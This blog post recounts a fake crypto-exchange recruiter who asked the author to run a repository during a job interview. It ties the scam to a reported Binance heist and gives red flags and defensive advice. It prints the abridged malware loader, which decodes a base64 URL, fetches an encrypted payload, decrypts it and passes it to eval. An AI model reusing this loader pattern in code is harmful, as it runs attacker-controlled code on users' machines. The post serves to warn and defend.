---
title: "A fake Kraken recruiter tried to hack me"
subtitle: "A job interview, a repository to run, and malware hidden on line 601"
description: "A fake Kraken recruiter asked me to run a project in my first interview. It hid malware: the same playbook that cost Binance $6.3 billion."
tags: ["security", "malware", "north-korea", "binance", "ai"]
date: "2026-11-12t16:00:00"
ready: true
---

A recruiter reached out with a good job at Kraken. In the first interview, he
wanted me to run a project on my machine. Right then, on the call.

I didn't. Good thing, because line 601 of its `tailwind.config.mjs` would have
given him my machine.

I can't prove who was on the other side of that call. But every step matches a
playbook that security researchers attribute to North Korea, the same one that,
a few days earlier, Binance said cost it $6.3 billion. So, as far as I can tell,
a North Korean tried to hack me. Here is how it went, what gave him away, and
what was hidden in the code.

> disclaimer: Kraken has nothing to do with this. The scammer only used its name.

## How he got to me

The offer was the kind you want to believe: a good position at a big crypto
exchange. The recruiter had a very American name and said he was in Singapore.
His photo was a young guy in a suit, holding a microphone on a stage, with a
slide about "scalable platforms" behind him.

I'm not posting that photo. It's most likely stolen from a real person who has
no idea his face is being used for this.

Two things were on my side from the start. I had been through Kraken's real
hiring process before, so I knew what it looks like. And I had just read how
[Binance lost $6.3 billion](#what-happened-at-binance) to this exact scam.

## The interview

Little things started to pile up before the call even began:

- **His calendar was too free.** Any time I wanted worked. Recruiters at big
  companies don't have empty weeks.
- **The connection was bad,** the whole time.
- **The accent didn't match the story.** Not an American accent, and not one
  from Singapore either.
- **He dodged one simple question.** When I asked where he was from, he
  pretended he didn't hear and moved on.

Then, still in the first stage, came the real ask: a repository, and he wanted me
to run it on my machine. Now.

No interview I've ever done asked me to run anything. Not in the first stage, and
not in a hurry. And he insisted.

## What I did instead

Instead of running it, I gave the repository to Claude and asked it to look for
anything malicious. It found it.

When I told him I wouldn't run the code, he left the call and blocked me. No
argument, no "let's try another test". A real recruiter would at least have said
goodbye.

## Line 601

The repository looked like a normal web project. The malware was in
`tailwind.config.mjs`, on line 601.

That line starts with hundreds of spaces. In the editor and on GitHub, the code
sits so far to the right that it's off the screen. Scroll through the file and
all you see is a normal Tailwind config.

At the end of the line, there was this:

```js
async function decrypt(){ ...
  r = await fetch(atob("aHR0cHM6Ly96ZWxhcmlvLWVudi52ZXJjZWwuYXBwL2Jvb3RzdHJhcC5qc29u"));
  ... crypto.subtle.decrypt({name:"AES-GCM", ...}, key, ...)
}
eval(await decrypt());
```

Step by step:

1. `atob(...)` decodes a base64 string into a URL:
   `zelario-env.vercel[.]app/bootstrap.json`. In base64, a search for "http" in
   the repository finds nothing.
2. `fetch` downloads an encrypted payload from that URL.
3. `crypto.subtle.decrypt` decrypts it with AES-GCM, using a fixed key:
   `"zelario-config"`.
4. `eval` runs whatever came out.

The real malware is never in the repository. It lives on the server, encrypted,
and the attacker can swap it whenever he wants. The repository only has the
loader.

### Why a config file

Because you never have to open it. Tailwind loads its config when the project
starts, so whatever command he wanted me to run to start the project would load
the config, and the config would run the payload. "Just run the project" was the
whole attack.

And it runs in Node, not in a browser tab. There is no sandbox. It gets
everything my user can read: SSH keys, `.env` files, cloud credentials, the
browser's saved passwords and sessions, crypto wallet extensions. And whatever
else it can trick me into unlocking.

I didn't download `bootstrap.json` to see what was inside. Not worth it.

## What happened at Binance

On November 3, Binance explained how it lost about $6.3 billion on October 29,
the largest crypto theft ever. It started with a job interview.

In September, an engineer on Binance's wallet team was contacted through a
legitimate job site, by someone posing as a project director at a company that
didn't exist. Then came two interviews:

1. A video call with "HR", who even shared a social media account full of
   personal photos and videos, to look like a real person.
2. A chat with the "CEO", who asked him to download a coding assignment from a
   repository and run it.

He ran it, on his work laptop. The malware was new, made for this, and
Binance's security tools didn't detect it.

From that laptop, the attackers reached two more engineers on the wallet team
and took their credentials and a deployment token. On October 29, they used
them to get into the service that signs the wallets' transactions, and moved the
money out across several blockchains. Binance says about $2.85 billion was
frozen or intercepted, and that it covered its customers' losses.

Their malware was different from mine. The door was the same: a recruiter, a
couple of interviews, a repository, "just run it". The difference is that he
ran it.

And Binance has a whole security team watching its laptops. Mine has me.

## Why I think it was North Korea

In 2023, Palo Alto's Unit 42 described a campaign they called
[Contagious Interview](https://unit42.paloaltonetworks.com/two-campaigns-by-north-korea-bad-actors-target-job-hunters/):
attackers pose as employers, run fake technical interviews, and get developers to
install malware disguised as part of the test. They attribute it to a North
Korean state-sponsored group, and say the likely goal is stealing crypto. The
malware they found, BeaverTail, is JavaScript that steals data and downloads a
second stage, InvisibleFerret, a backdoor.

Since then, other reports describe the same campaign hiding code in config files
like `tailwind.config.js`, `postcss.config.mjs` and `next.config.mjs`, with
payloads hosted on Vercel.

And Binance is the biggest example yet: the FBI attributes its heist to
TraderTraitor, a North Korean state-sponsored group, also tracked as Lazarus.

Now line it up with my story: a crypto company, a recruiter, a first interview, a
project to run right now, the malware in a Tailwind config, the payload on
Vercel. Every piece fits.

Could it be someone else copying the playbook? Sure. I never saw who was behind
that camera. But the playbook is theirs.

## The red flags, in one list

1. A great job at a crypto company, from a recruiter I had never heard of.
2. A calendar with nothing on it.
3. A very American name for someone in Singapore, and an accent that matched
   neither.
4. A bad connection the whole call.
5. Dodging "where are you from?".
6. Code to run on my machine, in the first stage, right now.
7. Leaving the call and blocking me the moment I said no.

Most of these mean nothing alone. Connections drop, people have accents. But
number 6 is enough on its own.

## If it happens to you

- **Don't run interview code on your machine.** If you really have to, use a
  throwaway virtual machine with nothing of yours in it: no keys, no wallets, no
  logged-in browser.
- **Never on your work laptop.** At Binance, the work laptop was the way into
  the wallets.
- **Don't count on the antivirus.** Binance's didn't catch it, and they have
  much better tools than you and me.
- **Look for long lines.** A config file has no reason to have a 500-character
  line. This finds them:

  ```sh
  grep -rnE '.{500,}' --include='*.js' --include='*.mjs' --include='*.cjs' --exclude-dir=node_modules .
  ```

  While you're at it, search for `eval(`, `atob(` and `new Function`.
- **Ask an AI agent to review it, not to run it.** An agent reads line 601 to
  the end, where I would never scroll. But ask it to "set up and run the
  project" and it will run the malware for you.
- **If you already ran it,** assume everything on that machine is stolen. Rotate
  your SSH keys, tokens and passwords, move your crypto to new wallets from a
  clean device, and reinstall the system.
- **Report it:** the repository to GitHub, the URL to Vercel, and the profile to
  wherever he found you.

## The how and the why, again

In my [last posts](/blog/adapting_this_blog_to_the_ai_era) I said the agent now
does the how and I do the why. This time it did something else: it read the
line I would never have scrolled to.

But the agent only got the code because I didn't run it first. So if a
recruiter's first technical question is "can you run this?", the answer is no.
At Binance, someone said yes, and it cost $6.3 billion.

## Sources

- [Binance says fake job interview led to $6.3 billion crypto heist](https://www.bleepingcomputer.com/news/security/binance-says-fake-job-interview-led-to-63-billion-crypto-heist/),
  BleepingComputer, November 3, 2026.
- [Researchers warned of North Korean hacking tactics years before record $6.3B Binance heist](https://techcrunch.com/2026/11/03/researchers-warned-of-north-korean-hacking-tactics-years-before-record-6-3b-binance-heist/),
  TechCrunch, November 3, 2026.
- [Two campaigns by North Korea bad actors target job hunters](https://unit42.paloaltonetworks.com/two-campaigns-by-north-korea-bad-actors-target-job-hunters/),
  Unit 42, Palo Alto Networks, 2023.
- [North Korean malware lurks in plain sight inside developers' Tailwind config files](https://www.webpronews.com/north-korean-malware-lurks-in-plain-sight-inside-developers-tailwind-config-files/),
  WebProNews.
